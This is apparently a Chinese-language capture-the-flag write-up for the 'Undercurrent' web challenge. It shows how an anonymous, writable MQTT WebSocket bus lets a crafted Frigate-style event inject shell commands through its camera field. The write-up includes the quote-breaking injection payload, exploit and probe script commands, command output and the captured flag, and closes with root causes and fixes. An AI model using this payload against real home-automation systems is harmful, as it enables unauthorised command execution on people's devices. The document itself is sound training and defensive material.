# Web · Undercurrent

## 结果

```text
flag{OnID0LXdWhQNFIRM47xSPKCbbAcr8TiQaSn8PnHd}
```

证据等级：E2。flag 来自 `evidence/undercurrent-flag.txt` 中可回放的 MQTT 遥测回显。

## 题面与入口

入口同时暴露 FastAPI HTTP 服务和 MQTT-over-WebSocket：

- HTTP：`http://<TARGET_HOST>:<TARGET_PORT>`
- MQTT WebSocket：`/mqtt`
- 事件主题：`frigate/+/events`
- 遥测主题：`home/+/telemetry`

健康检查直接说明了消息总线结构：

```json
{
  "ok": true,
  "service": "stream-test",
  "mqtt_websocket_path": "/mqtt",
  "mqtt_subprotocol": "mqtt",
  "event_topic_pattern": "frigate/+/events",
  "telemetry_topic_pattern": "home/+/telemetry"
}
```

## 漏洞链

1. MQTT WebSocket 允许匿名连接，`CONNACK return_code=0`。
2. 向 `frigate/entry/events` 发布 Frigate 风格事件：

```json
{"type":"new","after":{"camera":"--help","label":"person"}}
```

3. 家庭自动化把 `after.camera` 拼进 shell 命令，形态等价于：

```sh
unlock --camera '<camera>'
```

4. `camera` 使用单引号闭合后即可命令注入，输出写回
   `home/a78329b80ed46d03/telemetry`。

最终 payload：

```json
{
  "type": "new",
  "after": {
    "camera": "entry';cat$IFS/flag;'",
    "label": "person"
  }
}
```

遥测回显：

```json
{
  "camera": "entry';cat$IFS/flag;'",
  "stdout": "unlock-ok:unlock --camera entry\nflag{OnID0LXdWhQNFIRM47xSPKCbbAcr8TiQaSn8PnHd}\n",
  "stderr": ""
}
```

## 完整复现

仓库内包含一个不依赖第三方 MQTT 库的最小 WebSocket 客户端和利用封装：

```bash
python scripts/undercurrent/exploit.py \
  --host <TARGET_HOST> \
  --port <TARGET_PORT> \
  --command 'cat$IFS/flag'
```

也可以直接使用底层探针：

```bash
python scripts/undercurrent/ws_mqtt_probe.py \
  --host <TARGET_HOST> --port <TARGET_PORT> --path /mqtt \
  --topics 'home/#,frigate/#' \
  --publish 'frigate/entry/events={"type":"new","after":{"camera":"entry'"'"';id;'"'"'","label":"person"}}' \
  --wait 8
```

先验证命令注入：

```text
uid=103(homeassistant) gid=105(homeassistant)
```

再读取目标文件：

```text
flag{OnID0LXdWhQNFIRM47xSPKCbbAcr8TiQaSn8PnHd}
```

## 根因

- 消息总线匿名可写。
- 外部事件字段未经校验进入 `shell=True` 自动化命令。
- 事件主题与遥测主题允许任意客户端订阅，形成稳定的命令输出通道。

## 修复建议

1. MQTT 启用认证、ACL 和主题级授权。
2. 自动化执行改为参数数组，不使用 shell 字符串拼接。
3. 对摄像头名、标签等事件字段使用严格 allowlist。
4. 遥测主题只允许服务账号发布、管理端订阅。

## 证据

- `evidence/undercurrent-flag.txt`
- `scripts/undercurrent/ws_mqtt_probe.py`
- `scripts/undercurrent/exploit.py`
